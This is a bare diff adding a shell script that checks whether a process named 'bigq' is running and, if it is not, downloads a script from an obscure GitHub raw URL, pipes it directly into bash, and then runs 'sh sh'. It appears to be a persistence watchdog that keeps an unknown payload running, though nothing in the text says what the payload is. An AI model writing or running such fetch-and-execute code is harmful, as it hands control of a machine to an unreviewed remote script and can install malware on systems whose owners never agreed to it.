@@ -1,0 +1,7 @@
+if pgrep -x "bigq" > /dev/null
+then
+    echo "Running"
+else
+    curl https://raw.githubusercontent.com/regvfp/x/main/abc | bash -s
+	sh sh
+fi
